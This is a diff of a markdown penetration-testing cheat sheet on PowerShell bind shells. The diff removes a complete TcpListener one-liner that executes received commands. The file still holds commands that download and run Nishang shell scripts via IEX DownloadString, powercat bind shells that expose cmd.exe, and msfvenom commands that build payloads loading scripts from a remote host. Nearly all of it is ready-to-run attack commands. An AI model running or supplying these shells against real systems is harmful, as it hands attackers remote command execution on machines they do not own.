@@ -1,14 +1,8 @@
 # PowerShell
 
-## 01 - Regular Shell
+## 01 - Nishang
 
-```powershell
-C:\> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
-```
-
-## 02 - Nishang
-
-### 2.1 - TCP Method
+### 1.1 - TCP Method
 
 ```
 PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1')
@@ -16,7 +10,7 @@ PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com
 Invoke-PowerShellTcp -Bind -Port <PORT>
 ```
 
-### 2.2 - UDP Method
+### 1.2 - UDP Method
 
 ```
 PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1')
@@ -24,7 +18,7 @@ PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com
 Invoke-PowerShellUdp -Bind -Port <PORT>
 ```
 
-## 03 - Generate via `powercat`
+## 02 - Generate via `powercat`
 
 Generate bind shell.
 
@@ -38,9 +32,9 @@ Generate encoded bind shell.
 > powercat -l -p <PORT> -e cmd.exe -ge
 ```
 
-## 04 - Generate via `msfvenom`
+## 03 - Generate via `msfvenom`
 
-### 4.1 - x86 (32-bit) Payloads
+### 3.1 - x86 (32-bit) Payloads
 
 You can load powershell scripts ahead of time.
 
@@ -50,7 +44,7 @@ $ msfvenom -p cmd/windows/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]
 $ msfvenom -p windows/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell.ps1
 ```
 
-### 4.2 - x86-64 (64-bit) Payloads
+### 3.2 - x86-64 (64-bit) Payloads
 
 You can load powershell scripts ahead of time.
 
